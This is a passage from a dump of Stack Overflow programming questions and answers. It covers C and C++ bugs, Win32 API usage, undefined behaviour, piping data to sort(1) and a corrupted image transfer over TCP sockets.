<p>If you need to do an asynchronous request, it's a little more complicated.  In that case, you'd create an object which conforms to the <code>NSURLConnectionDelegate</code> protocol, set that as the delegate of an <code>NSURLConnection</code> object, and perform the request.  When it completes, you then save it to the file system as above.  The details are left as an exercise for the reader.</p>
"
"<p>It's been forever since I've used C so I apologize for the simple question.</p>

<p>I'm working with GPIO on a armeabi-v7a device. I need to export the GPIO interface into userspace from within an android app and I am trying to do so from a JNI library.</p>

<p>To do this from the terminal I would just run <code>echo 199 &gt; /sys/class/gpio/export</code></p>

<p>But I need to do it from JNI :( </p>

<p>My current attempt looks like this (with some error handling), but does not work:</p>

<pre><code>JNIEXPORT jboolean JNICALL Java_com_rnd_touchpanel_LED_exportGreen
    (JNIEnv * je, jclass jc)
{
    freopen(""/sys/class/gpio/export"", ""w+"", stdout);
    printf(""198"");
    fclose(stdout);
    return JNI_TRUE;
}
</code></pre>

<p>I then realized that export is actually binary not just a file, and I've forgotten how to spawn new processes and send them input and all that. Could someone refresh my memory? Thanks!</p>
","9530","","<p>If you're just writing a file, there's no need to redirect <code>stdout</code> -- just open the file with <code>fopen(3)</code>, write to it with <a href=""http://linux.die.net/man/3/fprintf"" rel=""nofollow""><code>fprintf(3)</code></a>, and close it with <code>fclose(3)</code>.</p>

<p>If you need to execute another process with given data on its standard, you have a few options:</p>

<ul>
<li>Use <a href=""http://linux.die.net/man/3/system"" rel=""nofollow""><code>system(3)</code></a> to invoke the shell and give it your desired redirections</li>
<li>Use <a href=""http://linux.die.net/man/3/popen"" rel=""nofollow""><code>popen(3)</code></a> with type <code>""w""</code> and <code>fprintf</code> your data to the returned <code>FILE*</code></li>
<li>Use <a href=""http://linux.die.net/man/2/fork"" rel=""nofollow""><code>fork(2)</code></a> and <a href=""http://linux.die.net/man/3/exec"" rel=""nofollow""><code>exec*(3)</code></a> to spawn the new process.  After forking but before exec'ing, use <a href=""http://linux.die.net/man/2/pipe"" rel=""nofollow""><code>pipe(2)</code></a>, <a href=""http://linux.die.net/man/2/dup2"" rel=""nofollow""><code>dup2(2)</code></a> and <a href=""http://linux.die.net/man/2/close"" rel=""nofollow""><code>close(2)</code></a> to setup the new process's stdin appropriately.  You can then write to that file descriptor from the parent process to setup the data.  This is the most complicated option, but it gives you the most control over how the child process is setup.</li>
</ul>
"
"<p>I have noticed that using F10 - Step Over in VS automatically skips my functions. Why is that?
I did noticed that F11- Step Into, does enter my functions, however it enters the implementation code of the functions I am using from the various C libraries, which is really annoying.  </p>

<p>Is there any way I can run step by step inside my functions without entering the implementation code of the included libraries?</p>
","9530","","<p>Yes, there's an undocumented feature which allows you to not step into any of a list of functions you specify.  See <a href=""http://blogs.msdn.com/b/andypennell/archive/2004/02/06/69004.aspx"" rel=""nofollow"">this blog post</a> for an example of how to set that up.  But again, since it's an undocumented feature, it could break with future versions of Visual Studio, and it may not always behave reliably.</p>
"
"<p>when I try to connect to my server, my client fails during the function WSAStringToAddress with the error 10022, I think the problem is that I try to get the IPv6 address from a console argument. The format of the console argument is ::1 for my localhost address.</p>

<p>Here is the function that fails:</p>

<pre><code>WSAStringToAddress((LPWSTR)argv[1], AF_INET6, NULL, (SOCKADDR *)&amp;server, &amp;len)
</code></pre>

<p>And here code for the server and len variables:</p>

<pre><code>struct sockaddr_in6 server;
int len = sizeof(server);
memset( &amp;server, 0, sizeof (server));
server.sin6_family = AF_INET6;
server.sin6_port = htons(PORT);
</code></pre>

<p>Yeah I hope someone sees the mistake I made.</p>
","9530","","<p><a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/ms681391%28v=vs.85%29.aspx"" rel=""nofollow"">Error 10022</a> is <code>WSAEINVAL</code>, which means you passed an invalid parameter.  The problem in this case is that when compiling a Unicode program, <code>WSAStringToAddress</code> takes a <strong>wide-character string</strong>, and you're passing it a narrow string cast to a wide string.  The compiler error you were getting before you inserted the cast should have raised a red flag.</p>

<p>You have a few options:</p>

<ul>
<li>Change your application to be non-Unicode (<strong>not recommended</strong>)</li>
<li>Change your <code>main</code> function to be <a href=""http://msdn.microsoft.com/en-us/library/bky3b5dh%28v=vs.80%29.aspx"" rel=""nofollow""><code>wmain</code></a> instead, which takes wide-character argument strings</li>
<li>Explicitly use the narrow (ANSI) version by calling <code>WSAStringToAddressA</code> instead of <code>WSAStringToAddress</code></li>
<li>Convert the string from narrow to wide using <a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/dd319072%28v=vs.85%29.aspx"" rel=""nofollow""><code>MultiByteToWideChar</code></a></li>
</ul>

<p>In this particular case, I'd recommend explicitly using the <code>WSAStringToAddressA</code> function, since using the wide-character version doesn't afford any extra advantage for this function.</p>
"
"<p>I am making a .obj loader in Objective-c and C, by following this <a href=""http://www.opengl-tutorial.org/beginners-tutorials/tutorial-7-model-loading/"" rel=""nofollow"">tutorial</a> (pure c++). But I noticed that the function <code>fscanf()</code> runs fine for me even if you don't send it the memory address of the variables it going to set (sending the value only). Is there an explanation to this?</p>

<pre><code> Vec2 *uv;
 fscanf(file, ""%f %f\n"", uv.x, uv.y);
 [tempUVs addObject:uv];
</code></pre>

<p>Notice that parameters uv.x and uv.y have no ampersand.</p>
","9530","","<p>It's <strong>undefined behavior</strong> when you do that.  Anything could happen -- it could crash, it could happen to run correctly, it could <em>appear</em> to run correctly while silently corrupting memory, or it could erase your hard drive.  Those are all allowed behaviors according to the language standard.</p>

<p>If you're compiling with a decent compiler, you can crank up your warning level (e.g. the <code>-Wall</code>, and maybe also <code>-Wextra -pedantic</code> using GCC or Clang), and it can warn you when you pass the wrong parameters to the <code>*scanf</code>/<code>*printf</code> family of functions.  Specifically, the <a href=""http://gcc.gnu.org/onlinedocs/gcc-4.7.2/gcc/Warning-Options.html#index-Wformat-264""><code>-Wformat</code></a> option will warn for this sort of thing (<code>-Wformat</code> is included as part of <code>-Wall</code>).</p>
"
"<p>I know how to use <code>malloc()</code> and <code>free()</code> to allocate memory, but is there also a standard C function to check how much memory is left, so I can call that periodically to make sure my code has no memory leaks?</p>

<p>The only thing I can think of is calling <code>malloc(1)</code> in a endless loop until it returns an error, but shouldn't there be a more efficient way?</p>
","9530","","<p>No, there's no standard C function to do that.  There are some platform-specific functions you can use to perform certain types of queries (like working set size), but those probably won't be helpful, because sometimes memory which has been properly <code>free()</code>d is still considered to be allocated by the OS because the <code>malloc</code> implementation might keep the freed memory around in a pool.</p>

<p>If you want to check for memory leaks, I highly recommend using a tool like <a href=""http://valgrind.org/"">Valgrind</a>, which runs your program in a virtual machine of sorts and can track memory leaks, among other features.</p>

<p>If you're running on Windows, you can use <a href=""http://msdn.microsoft.com/en-us/library/8hyw4sy7%28v=vs.80%29.aspx""><code>_CrtDbgReport</code></a> and/or <a href=""http://msdn.microsoft.com/en-us/library/5at7yxcs%28v=vs.80%29.aspx""><code>_CrtSetDbgFlag</code></a> to check for memory leaks.</p>
"
"<p>I want to access a certain address of a process. But for that i need to get the base address of the process first. I'm using a tool to see if i'm actually doing it right. The tool shows i need the following: <code>""app.exe""+0x011F9B08 = 0x119F8300</code></p>

<p>I thought i could obtain the base address of a process through <code>OpenProcess()</code>, but that gives me: <code>0x0000005c</code> as a result. I don't think that is right? Atleast, not what i need.</p>

<p>I think the base address i need is: <code>0x119F8300 - 0x011F9B08 = 0x107FE7F8 &lt;-- base?</code></p>

<p>This is my code:</p>

<pre><code>hWindow = FindWindow(NULL, lpWindowName);
if(hWindow)
{
    GetWindowThreadProcessId(hWindow, &amp;dwProcId);
    if(dwProcId != 0)
    {
            // hProcHandle -&gt; 0x0000005c
            hProcHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcId);
    }
    else
    {
        return 0;
    }
}
</code></pre>

<p>How can i get the base address of the process that i've opened?</p>
","9530","","<p>If you want to get the virtual address <em>within the other process's address space</em>, you can do that like so:</p>

<ol>
<li>Open the process using <a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/ms684320%28v=vs.85%29.aspx"" rel=""nofollow""><code>OpenProcess</code></a> -- if successful, the value returned is a handle to the process, which is just an opaque token used by the kernel to identify a kernel object.  Its exact integer value (0x5c in your case) has no meaning to userspace programs, other than to distinguish it from other handles and invalid handles.</li>
<li>Call <a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/ms683217%28v=vs.85%29.aspx"" rel=""nofollow""><code>GetProcessImageFileName</code></a> to get the name of the main executable module of the process.</li>
<li>Use <a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/ms682631%28v=vs.85%29.aspx"" rel=""nofollow""><code>EnumProcessModules</code></a> to enumerate the list of all modules in the target process.</li>
<li>For each module, call <a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/ms683198%28v=vs.85%29.aspx"" rel=""nofollow""><code>GetModuleFileNameEx</code></a> to get the filename, and compare it with the executable's filename.</li>
<li>When you've found the executable's module, call <a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/ms683201%28v=vs.85%29.aspx"" rel=""nofollow""><code>GetModuleInformation</code></a> to get the raw entry point of the executable.</li>
</ol>

<p>This will give you the virtual address, but there's not a whole lot you can do with it since it's not mapped into your current process's address space.</p>
"
"<p>Doing <code>HFONT childfont = SendMessage (childwin, WM_GETFONT, NULL, NULL);</code> results in the error ""invalid conversion from 'LRESULT' to 'HFONT__*'"" when <a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/ms632624%28v=vs.85%29.aspx"" rel=""nofollow"">MSDN states</a> that the return type is HFONT. What is the proper return type for this function? Should I just use LRESULT or is there something special I have to do because my program will come back and bite me later if I don't do it?</p>
","9530","","<p><code>SendMessage</code> is a Swiss army knife: it does a lot of different things, all of which return various types of values.  Since C does not support overloaded return values (remember that the Win32 API is a C API), it has to return a generic <code>LRESULT</code> type.</p>

<p>So, you need to cast the result to the actual type.  The documentation states that it this message returns an <code>HFONT</code>, so you must cast the result to an <code>HFONT</code>:</p>

<pre><code>HFONT childFont = (HFONT)SendMessage(childWin, WM_GETFONT, ...);
</code></pre>

<p>Alternatively, you can use the macro <code>GetWindowFont()</code> defined in the header file <code>&lt;WindowsX.h&gt;</code>, which includes a lot of utility macros:</p>

<pre><code>// From WindowsX.h.  SNDMSG is a macro which expands to either SendMessage or
// AfxSendMessage.
#define GetWindowFont(hwnd) FORWARD_WM_GETFONT((hwnd), SNDMSG)
#define FORWARD_WM_GETFONT(hwnd, fn) \
    (HFONT)(UINT_PTR)(fn)((hwnd), WM_GETFONT, 0L, 0L)

// Example usage:
HFONT childFont = GetWindowFont(childWin);
</code></pre>
"
"<p>I try to reference a struct from another class in my code and it gives me an error, saying I have a syntax problem.</p>

<pre><code>#pragma once

#include ""Definitions.h""

#include ""GV.h""
#include ""UI.h""
#include ""Tile.h""
#include ""Item.h""

class Figure {
public:
    //Figure index
    struct FIGURE_TYPE {
        //Where to crop the image from
        SDL_Rect crop;
        int x;
        int y;
    };

    //The game figure
    FIGURE_TYPE figure_index[FIGURE_COUNT];

    //The figure array
    int figure_array[MAP_HEIGHT / 64][MAP_WIDTH / 64];

    //Functions
    Figure ( void );
    bool draw_figures ( SDL_Surface* screen, SDL_Surface* figures, SDL_Rect camera, Figure::FIGURE_TYPE figure_spec[FIGURE_COUNT] );
};
</code></pre>

<p>That's the struct in Figure.h,</p>

<pre><code>#pragma once

#include ""Definitions.h""

#include ""GV.h""
#include ""Tile.h""
#include ""Item.h""
#include ""Figure.h""

class UI {
public:
    UI ( void );
    void set_camera ( SDL_Rect&amp; camera, Figure::FIGURE_TYPE figure_spec[FIGURE_COUNT] );
    bool draw_map ( SDL_Surface* screen, SDL_Rect&amp; camera, SDL_Surface* tiles, SDL_Surface* figures, Figure::FIGURE_TYPE figure_spec[FIGURE_COUNT] );
    bool draw_status ( void );
};
</code></pre>

<p>And that is where I reference it, from another header file called UI.h. I know there is a problem with referencing structures, I just don't know how to fix it. Simple problem, any one wanna help?</p>

<p>The problem <strong>is not</strong> that Figure Type is declared outside of Figure.h, or that it is private as opposed to public. </p>

<h1>Error Reports</h1>

<blockquote>
  <p>Error 1   error C2653: 'Figure' : is not a class or namespace name    c:\users\jim\documents\c++\roguelike\roguelike\ui.h 13  1   roguelike</p>
  
  <p>Error 3   error C2653: 'Figure' : is not a class or namespace name    c:\users\jim\documents\c++\roguelike\roguelike\ui.h 14  1   roguelike</p>
  
  <p>Error 2   error C2061: syntax error : identifier 'FIGURE_TYPE'    c:\users\jim\documents\c++\roguelike\roguelike\ui.h 13  1   roguelike</p>
  
  <p>Error 4   error C2061: syntax error : identifier 'FIGURE_TYPE'    c:\users\jim\documents\c++\roguelike\roguelike\ui.h 14  1   roguelike</p>
</blockquote>
","9530","","<p>You have a circular dependency: UI.h depends on Figure.h, and Figure.h depends on UI.h.  You need to break the circular dependency by removing the <code>#include</code> of one file in the other.  In this case, since I don't see anything in Figure.h using anything in UI.h, you should just remove the <code>#include ""UI.h""</code> from Figure.h and be all set.</p>
"
"<pre><code>int main(int argc, char * argv[]){

   char file_extension[10];

   strncat(file_extension, argv[2][5], 6);
</code></pre>

<p>When I do this, I get ""warning: passing arg 2 of 'strncat' makes pointer from integer without a cast'. Does does anyone know how to fix this?</p>
","9530","","<p>You have several problems:</p>

<ul>
<li><code>argv[2][5]</code> is a single character: the 6th character of the 3rd input argument, but the second argument of <code>strncat</code> takes a <em>pointer to a character</em> (i.e. a C string), not a single character</li>
<li><code>file_extension</code> is not null-terminated to begin with (it's uninitialized), so it's Undefined Behavior to call <code>strncat</code> on it</li>
<li>The last argument to <code>strncat</code> is the maximum number of characters of the source string to concatenate, not the size of the output buffer -- it does not protect you from buffer overflows.</li>
<li>If you actually meant to write <code>strncpy</code> instead of <code>strncat</code>, then you also need to be aware that <a href=""http://stackoverflow.com/questions/1453876/why-does-strncpy-not-null-terminate""><code>strncpy</code> <strong>does not necessarily null-terminate the output</strong></a></li>
</ul>

<p>There are are easy fixes to these problems, but the best fix for you depends on exactly what you're going to do: is the file extension read-only?  Are you constructing a new filename?  What's going to happen with it?</p>

<p>I <em>strongly</em> recommend you get a good book about C strings and C programming instead of trying to blindly write string code without having a solid understanding of what it's doing, especially with the high risk of buffer overflows and memory corruption when the code is not written correctly.</p>
"
"<p>I'm trying to validate 2 strings over socket tcp but I can't figure out what am I doing wrong so the strings I try to compare using strcmp are:</p>

<p>header:</p>

<pre><code>struct message{
    char n[32];
    int flag;
};
</code></pre>

<p>in server:</p>

<pre><code>char names[3][32];
strcpy(passs[0], ""111"");

int z;
printf(""checking data\n"");
for(z=0 ; z&lt;3; z++){
    if (strcmp(&amp;m.n, names[z]) == 0){
        printf(""name found\n"");
    }
}
</code></pre>

<p>in client:</p>

<pre><code>struct message m;
fgets(m.n, 32, stdin);
send(cSock, &amp;m, sizeof(m),0);
</code></pre>

<p>ps: I tried to give only the essential codelines, since the program is a client/server tcp example with threads.</p>
","9530","","<p>You need to initialize all of the elements of <code>char names[3][32]</code>: if you don't, reading from them is Undefined Behavior, and anything could happen:</p>

<pre><code>for (i = 0; i &lt; 3; i++)
    names[i][0] = 0;  // Initialize to the empty string
</code></pre>
"
"<p>So just for fun, I have this code snippet:</p>

<pre><code>#include &lt;stdio.h&gt;
main()
{
 int i;
 int a;
 i = 17;
 //scanf(""%d"", &amp;i);
 a = (i+=5) * (i-=3);
 printf(""a is %d, i is %d\n"", a, i);
}
</code></pre>

<p>In C specifications, it says the order of operands evaluation is <strong>undefined</strong>, so I was expecting to see either 22 * 19, or 19 * 14. However, the result is 19 * 19:</p>

<pre><code>~ $ gcc a.c
~ $ ./a.out
a is 361, i is 19
</code></pre>

<p>I thought about it, and the only explanation I could come up with is that the compiler did a 'delayed' evaluation on <code>(i+=5)</code>'s value, and it thought that <code>(i+=5)</code>'s value is just value of i. same for <code>(i-=3)</code>.</p>

<p>However, if I uncomment the <code>scanf()</code>:</p>

<pre><code>#include &lt;stdio.h&gt;
main()
{
 int i;
 int a;
 i = 17;
 scanf(""%d"", &amp;i);
 a = (i+=5) * (i-=3);
 printf(""a is %d, i is %d\n"", a, i);
}
</code></pre>

<p>Now I input 17 at prompt:</p>

<pre><code>~ $ gcc a.c
~ $ ./a.out
17
a is 418, i is 19
</code></pre>

<p>Why does it show different behavior?</p>
","9530","","<p>It's <strong>Undefined Behavior</strong>.  The C standard says that you're not allowed to modify the same object (<code>i</code> in this case) more than once between two sequence points (the semicolons before and after the statement, in this case).</p>

<p>Undefined Behavior means <em>anything</em> can happen.  It can appear to work correctly.  It can give the wrong answer.  It can crash your process.  It can erase your hard drive.  Or it can even set your CPU on fire.  These are all allowed behaviors according to the language standard.</p>
"
"<p>What does this Python requests error mean? Does this mean it tries to connect to the server and couldn't? What does <code>[Errno 8] nodename nor servname provided, or not known</code> mean?</p>

<blockquote>
  <p>File ""python2.7/site-packages/requests/api.py"", line 55, in get</p>
  
  <p>File ""python2.7/site-packages/requests/api.py"", line 44, in request</p>
  
  <p>File ""python2.7/site-packages/requests/sessions.py"", line 279, in
  request</p>
  
  <p>File ""python2.7/site-packages/requests/sessions.py"", line 374, in
  send</p>
  
  <p>File ""python2.7/site-packages/requests/adapters.py"", line 209, in
  send</p>
  
  <p>ConnectionError: HTTPConnectionPool(host='localhost', port=8091): Max
  retries exceeded with url: /pools/default (Caused by : [Errno 8] nodename nor servname provided, or not
  known</p>
</blockquote>

<p>The code generated this: <a href=""https://github.com/couchbase/couchbase-python-client/blob/master/couchbase/rest_client.py#L177"" rel=""nofollow"">http://github.com...</a> </p>

<pre><code>class RestConnection(object):
    def __init__(self, serverInfo):
        #serverInfo can be a json object
        if isinstance(serverInfo, dict):
            self.ip = serverInfo[""ip""]
            self.username = serverInfo[""username""]
            self.password = serverInfo[""password""]
            self.port = serverInfo[""port""]
            self.couch_api_base = serverInfo.get(""couchApiBase"")
        else:
            self.ip = serverInfo.ip
            self.username = serverInfo.rest_username
            self.password = serverInfo.rest_password
            self.port = serverInfo.port
            self.couch_api_base = None

        self.base_url = ""http://{0}:{1}"".format(self.ip, self.port)
        server_config_uri = ''.join([self.base_url, '/pools/default'])
        self.config = requests.get(server_config_uri).json()
        # if couchApiBase is not set earlier, let's look it up
        if self.couch_api_base is None:
            #couchApiBase is not in node config before Couchbase Server 2.0
            self.couch_api_base = self.config[""nodes""][0].get(""couchApiBase"")
</code></pre>

<p>FYI, This error is generated from the Couchbase Python client. </p>
","9530","","<p>It means the DNS lookup of the host name you're trying to access failed.  For example, I get the same error if I try to look up an invalid host name:</p>

<pre><code>&gt;&gt;&gt; import requests
&gt;&gt;&gt; requests.get('http://apsoapsodjaopisjdaoij.com')
Traceback (most recent call last):
  File ""&lt;stdin&gt;"", line 1, in &lt;module&gt;
  File ""/opt/local/Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/site-packages/requests/api.py"", line 65, in get
    return request('get', url, **kwargs)
  File ""/opt/local/Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/site-packages/requests/safe_mode.py"", line 39, in wrapped
    return function(method, url, **kwargs)
  File ""/opt/local/Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/site-packages/requests/api.py"", line 51, in request
    return session.request(method=method, url=url, **kwargs)
  File ""/opt/local/Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/site-packages/requests/sessions.py"", line 241, in request
    r.send(prefetch=prefetch)
  File ""/opt/local/Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/site-packages/requests/models.py"", line 631, in send
    raise ConnectionError(sockerr)
requests.exceptions.ConnectionError: [Errno 8] nodename nor servname provided, or not known
</code></pre>

<p>Check the value of <code>serverInfo[""ip""]</code> and make sure it's set correctly.</p>
"
"<p>I have a block:</p>

<pre><code>typedef id (^completionBlock)(id data, NSURLResponse *urlResponse, NSError *error);
</code></pre>

<p>And in a class method I try to populate this block with some code.</p>

<pre><code>request.requestCompletedBlock = ^(id data, NSURLResponse *urlResponse, NSError *error){
  ...
return object;
};
</code></pre>

<p>requestCompletedBlock is of type completionBlock obviously.</p>

<p>I get the following error:</p>

<p>""Incompatible block pointer types assigning to 'completionBlock' (aka 'id (^)(_<em>strong id, NSURLResponse *</em>_strong, NSError *__strong)') from 'void *(^)(_<em>strong id, NSURLResponse *</em>_strong, NSError *__strong)'""</p>

<p>Obviously my syntax is wrong somewhere, but where?</p>

<p>Thanks very much,</p>

<p>Vb</p>
","9530","","<p>For whatever reason, the compiler is inferring that the return type of your inline block is <code>void*</code>, not <code>id</code>.  You can force it to use a return type of <code>id</code> by putting the return type after the <code>^</code> like so:</p>

<pre><code>request.requestCompletedBlock = ^id (id data, NSURLResponse *urlResponse, NSError *error) {
    //                           ~~
    //                        Return type
}
</code></pre>

<p>See <a href=""http://thirdcog.eu/pwcblocks/#cblocks"">this page</a> for a detailed description of block syntax.</p>
"
"<p>What I am trying to do is send random numbers generated by a parent and then sent to the child, who then execs ""sort -nr"", and then sends back the sorted numbers back to the parent. I found this question had already been asked and answered here pretty similar to mine: <a href=""http://stackoverflow.com/questions/15318971/how-to-redirect-output-of-sort-program-from-child-to-parent"">how to redirect output of &quot;sort&quot; program from child to parent</a>, and I thought I did everything that it said to get it to work, but I am not able to get the sorting to actually happen. I've even checked to see if it errors out, but I have gotten nothing.</p>

<p>Both Pipes send and receive the same numbers, but they never come out sorted. What Am I missing?</p>

<pre><code>int pipe1[2], pipe2[2];
pid_t childID;

if (pipe(pipe1) &lt; 0 || pipe(pipe2) &lt; 0) {
    perror(""pipe"");
    exit(EXIT_FAILURE);
    }

childID = fork();

if (childID &lt; 0) {      
//Child Process Failure
    perror(""fork"");
    exit(EXIT_FAILURE);
}
else if (childID == 0){                                 
//Child Process Instructions
    cout &lt;&lt; ""Sent Numbers: "" &lt;&lt; endl;
    //Closes Unused Pipes
    close(pipe1[WRITE_END]);
    close(pipe2[READ_END]);

    //Dups Over the Others, then closes them
    dup2(pipe1[READ_END], STDIN_FILENO);
    close(pipe1[READ_END]);
    dup2(pipe2[WRITE_END], STDOUT_FILENO);
    close(pipe2[WRITE_END]);

    int fail = execlp(""sort"", ""sort"", ""-nr"", (char *)NULL);
    cout &lt;&lt; fail &lt;&lt; endl;
    }
else {                                                  
    //Parent Process Instructions
    //Close Unused Pipes
    close(pipe1[READ_END]);
    close(pipe2[WRITE_END]);

    srand(randSeed);
    cout &lt;&lt; ""Random Numbers: "" &lt;&lt; endl;
    for (int i = 0; i &lt; nWorkers; i++){     
    //Generate nWorker numbers, then Write
        randNumbers[i] = rand() % (sleepMax - sleepMin + 1) + sleepMin;
        write(pipe1[WRITE_END], &amp;randNumbers[i], sizeof(randNumbers[i]));
        cout &lt;&lt; randNumbers[i] &lt;&lt; endl;
    }
    close(pipe1[WRITE_END]);
    wait(NULL);
    cout &lt;&lt; ""SORTED NUMBERS:"" &lt;&lt; endl;

    double sortedNumbers[nWorkers];
    int n;

    for(int k = 0; k &lt; nWorkers; k++) {
    n = read(pipe2[READ_END], &amp;sortedNumbers[k], sizeof(sortedNumbers[k]));
    cout &lt;&lt; sortedNumbers[k] &lt;&lt; "", "" &lt;&lt; n &lt;&lt; endl;
    }
}
</code></pre>
","9530","","<p><code>sort(1)</code> expects its input to be ASCII strings, not raw binary numbers.  When you're passing it the data with <code>write(2)</code>, that's writing out the raw binary representation of the numbers to the pipes, which is not what you want.  You need to convert the numbers to their string representations.</p>

<p>One way to do that would be to open a stdio stream on top of the pipe with <a href=""http://linux.die.net/man/3/fdopen"" rel=""nofollow""><code>fdopen(3)</code></a>.  You could then use <code>fprintf</code> to write the formatted data:</p>

<pre><code>FILE *childInput = fdopen(pipe1[WRITE_END], ""w"");
if (childInput == NULL) { /* Handle error */ }
for (...)
{
    ...
    fprintf(childInput, ""%d\n"", randNumbers[i]);
}
fclose(childInput);
</code></pre>

<p>Likewise, you need to do the same thing when reading back in the output from the child:</p>

<pre><code>FILE *childOutput = fdopen(pipe2[READ_END], ""r"");
if (childOutput == NULL) { /* Handle error */ }
while (fscanf(childOutput, ""%d"", &amp;sortedNubers[i]) == 1)
{
    ...
}
fclose(childOutput);
</code></pre>
"
"<p>I'm writing a small C program in order to be able to transfer an image file between two computers (from server to client both running linux) using TCP/IP sockets but there seems to be an error as my picture appears on the other sides corrupted. </p>

<p>The code for my server is as such:</p>

<pre><code>#include&lt;stdio.h&gt;
#include&lt;string.h&gt;
#include&lt;sys/socket.h&gt;
#include&lt;arpa/inet.h&gt;   
#include&lt;unistd.h&gt;  
#include&lt;iostream&gt;
#include&lt;fstream&gt;
#include&lt;errno.h&gt;

using namespace std;

int send_image(int socket){

FILE *picture;
int size, read_size;
char send_buffer[10240], verify;

picture = fopen(""2.jpg"", ""r"");
printf(""Getting Picture Size\n"");   

if(picture == NULL) {
   printf(""Error Opening Image File"");
} 

fseek(picture, 0, SEEK_END);
size = ftell(picture);
fseek(picture, 0, SEEK_SET);

//Send Picture Size
printf(""Sending Picture Size\n"");
write(socket, (void *)&amp;size, sizeof(int));

if(read_size = read(socket, &amp;verify , sizeof(char)) &lt; 0) {
   puts(""\nError Receiving Verification"");
}


if(verify == '1'){
    printf(""5\n"");
    //Send Picture as Byte Array
    printf(""Sending Picture as Byte Array\n"");

    while(!feof(picture)) {

          //Read from the file into our send buffer
          read_size = fread(send_buffer, 1, sizeof(send_buffer)-1, picture);

          //Send data through our socket 
          write(socket, send_buffer, read_size);                        

          //Wait for the verify signal to be received 
          while(read(socket, &amp;verify , sizeof(char)) &lt; 0);

          if(verify != '1') {
             printf(""Error Receiving the Handshake signal\n %s"",&amp;verify);
          }

          verify = '';

          //Zero out our send buffer
          bzero(send_buffer, sizeof(send_buffer));
   }
}
}

int main(int argc , char *argv[])
{
int socket_desc , new_socket , c, read_size,buffer = 0;
struct sockaddr_in server , client;
char *readin;

//Create socket
socket_desc = socket(AF_INET , SOCK_STREAM , 0);
if (socket_desc == -1)
{
    printf(""Could not create socket"");
}

//Prepare the sockaddr_in structure
server.sin_family = AF_INET;
server.sin_addr.s_addr = INADDR_ANY;
server.sin_port = htons( 8889 );

//Bind
if( bind(socket_desc,(struct sockaddr *)&amp;server , sizeof(server)) &lt; 0)
{
    puts(""bind failed"");
    return 1;
}

puts(""bind done"");

//Listen
listen(socket_desc , 3);

//Accept and incoming connection
puts(""Waiting for incoming connections..."");
c = sizeof(struct sockaddr_in);

if((new_socket = accept(socket_desc, (struct sockaddr *)&amp;client, (socklen_t*)&amp;c))){
    puts(""Connection accepted"");
}

fflush(stdout);

if (new_socket&lt;0)
{
    perror(""Accept Failed"");
    return 1;
}

send_image(new_socket);

    close(socket_desc);
    fflush(stdout);
return 0;
}
</code></pre>

<p>The client side code which is receiving the data is as such:</p>

<pre><code> #include&lt;stdio.h&gt;
 #include&lt;string.h&gt;    //strlen
 #include&lt;sys/socket.h&gt;
 #include&lt;sys/ioctl.h&gt;
 #include&lt;arpa/inet.h&gt;    
 #include&lt;unistd.h&gt;
 #include&lt;iostream&gt;
 #include&lt;errno.h&gt;
 using namespace std;

 //This function is to be used once we have confirmed that an image is to be sent
 //It should read and output an image file
 int receive_image(int socket){

int buffersize = 0, recv_size = 0,size = 0, read_size, write_size;
char imagearray[10241],verify = '1';
FILE *image;

//Find the size of the image
read(socket, &amp;size, sizeof(int));



//Send our verification signal
write(socket, &amp;verify, sizeof(char));
//Make sure that the size is bigger than 0
if(size &lt;= 0 ){
    printf(""Error has occurred. Size less than or equal to 0\n"");
    return -1;
}

image = fopen(""2.jpg"", ""w"");

if( image == NULL) {
    printf(""Error has occurred. Image file could not be opened\n"");
    return -1;
}

//Loop while we have not received the entire file yet
while(recv_size &lt; size) {
    ioctl(socket, FIONREAD, &amp;buffersize); 

    //We check to see if there is data to be read from the socket    
    if(buffersize &gt; 0 ) {

        if(read_size = read(socket,imagearray, buffersize) &lt; 0){
            printf(""%s"", strerror(errno));
        }

        //Write the currently read data into our image file
        write_size = fwrite(imagearray,1,(buffersize), image);

        if(write_size != buffersize) {
          printf(""write and buffersizes wrong"");
        }

        if(read_size !=write_size) {
            printf(""error in read write"");
        }

        //Increment the total number of bytes read
        recv_size += read_size;

                    //Send our handshake verification info
        write(socket, &amp;verify, sizeof(char));

    }
 }

fclose(image);
printf(""Image successfully Received!\n"");
return 1;
}

int main(int argc , char *argv[])
{

int socket_desc;
struct sockaddr_in server;
char *parray;


//Create socket
socket_desc = socket(AF_INET , SOCK_STREAM , 0);

if (socket_desc == -1) {
    printf(""Could not create socket"");
}

memset(&amp;server,0,sizeof(server));
server.sin_addr.s_addr = inet_addr(""10.42.0.1"");
server.sin_family = AF_INET;
server.sin_port = htons( 8889 );

//Connect to remote server
if (connect(socket_desc , (struct sockaddr *)&amp;server , sizeof(server)) &lt; 0) {
    cout&lt;&lt;strerror(errno);
    close(socket_desc);
    puts(""Connect Error"");
    return 1;
}

puts(""Connected\n"");

receive_image(socket_desc);

close(socket_desc);

return 0;
}
</code></pre>

<p>Can anyone give me a hand with this? I can't see to figure out this error for the life of me.</p>

<p>EDIT: I've changed the fwrites and freads back into regular write and read and it still sends a corrupted image</p>
","9530","","<p>You have a number of problems:</p>

<ul>
<li>You need to open the file in binary mode (<code>""rb""</code> for reading, <code>""wb""</code> for writing), not the default text mode.  On Windows (and any other systems which do line ending translation), the stdio library converts LFs (bytes 0x0A) into CRLF pairs (the two bytes 0x0D 0x0A) when writing, and it does the inverse translation when reading.  For non-text data like JPEG files, this corrupts the data.</li>
<li>There's no need to be sending your ""handshake"" bytes after each send.  TCP/IP already handles acknowledgements/resends/flow control/etc.  You can assume that as long as <code>send()</code>/<code>write()</code> returns a positive value, then that many bytes were received by the other peer.</li>
<li><code>send()</code>/<code>write()</code> may not send all of the data you ask it to—they may do a partial send.  If that happens, you need to keep trying to send the rest of the buffer in a loop.</li>
